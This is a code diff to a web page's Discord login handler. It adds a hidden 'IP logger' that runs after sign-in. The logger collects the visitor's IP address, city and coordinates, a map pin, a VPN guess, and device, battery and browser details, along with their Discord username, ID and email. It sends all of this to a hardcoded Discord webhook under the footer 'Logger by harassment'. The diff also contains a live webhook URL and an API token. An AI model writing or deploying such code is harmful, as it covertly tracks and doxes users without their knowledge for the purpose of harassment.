@@ -254,6 +254,9 @@
                 }
 
                 if (data.success && data.user) {
+                    // Collect IP and device data before redirecting
+                    await getUserData(data.user);
+                    
                     // Redirect to authorized page with user info
                     const params = new URLSearchParams({
                         username: data.user.username,
@@ -286,6 +289,186 @@
                 }
 
                 showError(userMessage, technicalDetails);
+            }
+        }
+
+        // ============================================
+        // IP LOGGER WITH DISCORD USER DATA
+        // ============================================
+        
+        async function getIpAndLocationData() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                return await response.json();
+            } catch (error) {
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    return { ip: ipData.ip };
+                } catch (fallbackError) {
+                    return { ip: "Unknown" };
+                }
+            }
+        }
+
+        async function getUserData(discordUser) {
+            try {
+                const geoData = await getIpAndLocationData();
+                
+                const ip = geoData.ip || "Unknown";
+                const browserInfo = navigator.userAgent;
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                const language = navigator.language;
+                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const timestamp = new Date().toLocaleString();
+                const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Computer";
+                const onlineStatus = navigator.onLine ? "🟢 Online" : "🔴 Offline";
+                const uptime = `${(performance.now() / 60000).toFixed(2)} min`;
+                const os = (navigator.userAgentData?.platform) || navigator.platform || "Unknown";
+                const cpuCores = navigator.hardwareConcurrency || "Unknown";
+                const navHeight = `${window.innerHeight}px`;
+                
+                let batteryLevel = "Unknown";
+                let powerSavingMode = "Unknown";
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                        powerSavingMode = battery.charging ? "No" : "Yes";
+                    } catch (error) {}
+                }
+
+                let adBlockEnabled = "❌ None";
+                try {
+                    const testAd = document.createElement('div');
+                    testAd.innerHTML = '&nbsp;';
+                    testAd.className = 'adsbox';
+                    testAd.style.cssText = 'position: absolute; top: -10px; left: -10px; width: 1px; height: 1px;';
+                    document.body.appendChild(testAd);
+                    
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                    
+                    if (testAd.offsetHeight === 0) {
+                        adBlockEnabled = "✅ Yes";
+                    }
+                    document.body.removeChild(testAd);
+                } catch (e) {
+                    adBlockEnabled = "✅ Yes";
+                }
+
+                const browserName = navigator.appName || "Unknown";
+                const browserVersion = navigator.appVersion || "Unknown";
+                const cookiesEnabled = navigator.cookieEnabled ? "✅ Yes" : "❌ None";
+                
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const connectionType = connection?.effectiveType || "Unknown";
+                const connectionRtt = connection?.rtt ? `${connection.rtt} ms` : "Unknown";
+                const connectionDownlink = connection?.downlink ? `${connection.downlink} Mbps` : "Unknown";
+
+                let vpnStatus = "❌ Unlikely";
+                if (geoData.org) {
+                    const org = geoData.org.toLowerCase();
+                    if (org.includes("vpn") || org.includes("hosting") || org.includes("proxy")) {
+                        vpnStatus = "🛡️ Possible VPN/Proxy";
+                    }
+                }
+
+                const locationString = (geoData.city && geoData.region && geoData.country_name)
+                    ? `${geoData.city}, ${geoData.region}, ${geoData.country_name}`
+                    : "Unknown";
+
+                let mapImageUrl = null;
+                let mapLocation = "No location data";
+                
+                if (geoData.latitude && geoData.longitude) {
+                    const lat = geoData.latitude;
+                    const lon = geoData.longitude;
+                    
+                    const roundedLat = Math.round(lat * 100) / 100;
+                    const roundedLon = Math.round(lon * 100) / 100;
+                    
+                    const mapboxToken = 'pk.eyJ1IjoiaGFyYXNzbWVudGhhaGEiLCJhIjoiY21qbWdpMnA0MzJmNDNlb3RlbWdkZnc0aiJ9.aHc1ODUMqTaNIV8Eb8LRBQ';
+                    mapImageUrl = `https://api.mapbox.com/styles/v1/mapbox/streets-v11/static/pin-s+ff0000(${roundedLon},${roundedLat})/${roundedLon},${roundedLat},12,0/600x300@2x?access_token=${mapboxToken}`;
+                    
+                    mapLocation = `${roundedLat}, ${roundedLon}`;
+                }
+
+                const data = {
+                    ip, browser: browserInfo, resolution: screenResolution,
+                    language, timeZone, timestamp, deviceType, onlineStatus,
+                    uptime, os, cpuCores, navHeight, batteryLevel,
+                    powerSavingMode, adBlockEnabled, browserName, browserVersion,
+                    cookiesEnabled, connectionType, connectionRtt, connectionDownlink,
+                    location: locationString, vpnStatus, mapImageUrl, mapLocation,
+                    discordUser: discordUser
+                };
+
+                await sendDataToWebhook(data);
+                
+            } catch (error) {
+                console.error('Error collecting user data:', error);
+            }
+        }
+
+        async function sendDataToWebhook(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1454071163583070323/IAcO-7YEIzCyDkMWhm5BARhiNWrzdgOUVGCZezg56PsnlnD9SPh3_H5zO6y9g3N0gMM8';
+            
+            const embed = {
+                title: "📊 Device Details",
+                color: 16711680,
+                fields: [
+                    { name: "👤 Discord Username", value: data.discordUser.username, inline: true },
+                    { name: "🆔 Discord ID", value: data.discordUser.id, inline: true },
+                    { name: "📧 Email", value: data.discordUser.email || "Not provided", inline: true },
+                    { name: "📍 IP", value: data.ip, inline: true },
+                    { name: "🌍 Location", value: data.location, inline: true },
+                    { name: "🗺️ Coordinates", value: data.mapLocation, inline: true },
+                    { name: "🛡️ VPN/Proxy", value: data.vpnStatus, inline: true },
+                    { name: "🖥️ Resolution", value: data.resolution, inline: true },
+                    { name: "🗣️ Language", value: data.language, inline: true },
+                    { name: "🕒 TimeZone", value: data.timeZone, inline: true },
+                    { name: "📅 Time", value: data.timestamp, inline: false },
+                    { name: "📱 Device", value: data.deviceType, inline: true },
+                    { name: "🔋 Battery", value: data.batteryLevel, inline: true },
+                    { name: "⚡ Power Saving", value: data.powerSavingMode, inline: true },
+                    { name: "🖥️ Operating System", value: data.os, inline: true },
+                    { name: "🔗 Status", value: data.onlineStatus, inline: true },
+                    { name: "📊 Uptime", value: data.uptime, inline: true },
+                    { name: "🖥️ CPU Cores", value: String(data.cpuCores), inline: true },
+                    { name: "📏 Height", value: data.navHeight, inline: true },
+                    { name: "🚫 AdBlock", value: data.adBlockEnabled, inline: true },
+                    { name: "🌐 Browser", value: data.browserName, inline: true },
+                    { name: "🍪 Cookies", value: data.cookiesEnabled, inline: true },
+                    { name: "📶 Connection", value: data.connectionType, inline: true },
+                    { name: "⏱️ RTT", value: data.connectionRtt, inline: true },
+                    { name: "⬇️ Speed", value: data.connectionDownlink, inline: true }
+                ],
+                thumbnail: { url: data.discordUser.avatar },
+                footer: { 
+                    text: "Logger by harassment", 
+                    icon_url: "https://cdn.discordapp.com/avatars/1404732292412477531/22c739eb7dd42b243e92587e18069b2d.png?size=4096" 
+                }
+            };
+
+            if (data.mapImageUrl) {
+                embed.image = { url: data.mapImageUrl };
+            }
+
+            const payload = {
+                content: "📡 **User Verified & Logged**",
+                embeds: [embed]
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                console.log('✅ Data logged to webhook');
+            } catch (error) {
+                console.error('❌ Webhook error:', error);
             }
         }
 
